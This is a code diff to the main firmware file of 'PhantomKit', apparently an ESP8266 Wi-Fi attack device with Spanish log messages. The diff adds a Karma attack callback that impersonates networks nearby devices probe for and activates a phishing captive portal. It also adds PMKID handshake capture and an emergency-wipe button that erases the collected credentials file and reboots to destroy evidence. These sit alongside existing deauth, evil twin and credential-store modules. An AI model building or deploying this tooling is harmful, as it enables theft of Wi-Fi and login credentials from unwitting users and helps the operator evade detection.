@@ -11,6 +11,7 @@
 #include "wifi/evil_twin.h"
 #include "wifi/auto_portal.h"
 #include "wifi/channel_hopper.h"
+#include "wifi/pmkid_capture.h"
 #include "portal/captive_portal.h"
 #include "portal/credential_store.h"
 #include "notifier.h"
@@ -33,6 +34,7 @@ BeaconFloodModule beaconModule;
 ProbeSnifferModule probeModule;
 EvilTwinModule evilTwinModule;
 AutoPortalModule autoPortalModule;
+PMKIDCaptureModule pmkidModule;
 
 #include <time.h>
 
@@ -62,6 +64,28 @@ static String getTimestamp() {
     return String(buf);
 }
 
+// Forward declaration (addLog is defined after karmaCallback)
+void addLog(const String& msg);
+
+// ---------------------------------------------------------------------------
+// Karma Attack callback
+// Called by ProbeSnifferModule when a new SSID probe is detected.
+// Changes the softAP SSID to match the probed SSID and activates the portal
+// with the best-fit template.
+// ---------------------------------------------------------------------------
+void karmaCallback(const String& ssid, int templateIdx) {
+    addLog("[KARMA] Dispositivo buscando: " + ssid
+           + " -> template: " + String(templateIdx));
+    // Change AP SSID to match the probed SSID
+    apManager.setSSID(ssid);
+    apManager.restartAP();
+    // Set best template
+    captivePortal.setTemplate(templateIdx);
+    // Activate portal
+    captivePortal.setActive(true);
+    addLog("[KARMA] Portal activo como: " + ssid);
+}
+
 void addLog(const String& msg) {
     logBuffer += "[" + getTimestamp() + "] " + msg + "\n";
 
@@ -80,12 +104,13 @@ void addLog(const String& msg) {
     Serial.println(msg);
 }
 
+
 void setup() {
     Serial.begin(115200);
     delay(1000);
 
     addLog("ESP8266 PhantomKit iniciando...");
-    addLog("Version 1.2.0 - Todos los modulos activos");
+    addLog("Version 1.3.0 - Auto-Attack, Karma, OUI, PMKID, Emergency Wipe");
 
     if (!LittleFS.begin()) {
         addLog("ERROR: LittleFS no se pudo montar");
@@ -143,10 +168,17 @@ void setup() {
     probeModule.begin();
     evilTwinModule.begin();
     autoPortalModule.begin();
+    pmkidModule.begin();
+
+    // GPIO emergency wipe setup
+#if GPIO_WIPE_PIN >= 0
+    pinMode(GPIO_WIPE_PIN, INPUT_PULLUP);
+    addLog("GPIO Wipe: pin " + String(GPIO_WIPE_PIN) + " (mantener " + String(GPIO_WIPE_HOLD_MS / 1000) + "s)");
+#endif
     
-    webServer = new PhantomWebServer(credStore, captivePortal, apManager, 
-                                      deauthModule, beaconModule, probeModule, 
-                                      evilTwinModule, autoPortalModule);
+    webServer = new PhantomWebServer(credStore, captivePortal, apManager,
+                                      deauthModule, beaconModule, probeModule,
+                                      evilTwinModule, autoPortalModule, pmkidModule);
     webServer->begin();
     
     captivePortal.begin(webServer->getServer());
@@ -170,11 +202,31 @@ void loop() {
     deauthModule.update();
     probeModule.update();
     evilTwinModule.update();
-    
+
     // Auto-portal analysis
     if (autoPortalModule.isScanning()) {
         autoPortalModule.analyzeResults();
     }
-    
+
+    // GPIO Emergency Wipe (NodeMCU FLASH button)
+#if GPIO_WIPE_PIN >= 0
+    {
+        static unsigned long wipePressStart = 0;
+        if (digitalRead(GPIO_WIPE_PIN) == LOW) {
+            if (wipePressStart == 0) wipePressStart = millis();
+            else if (millis() - wipePressStart >= GPIO_WIPE_HOLD_MS) {
+                addLog("!!! EMERGENCY WIPE ACTIVADO !!!");
+                credStore.clear();
+                LittleFS.remove("/credentials.csv");
+                LittleFS.remove("/notify.cfg");
+                delay(500);
+                ESP.restart();
+            }
+        } else {
+            wipePressStart = 0;
+        }
+    }
+#endif
+
     delay(1);
 }
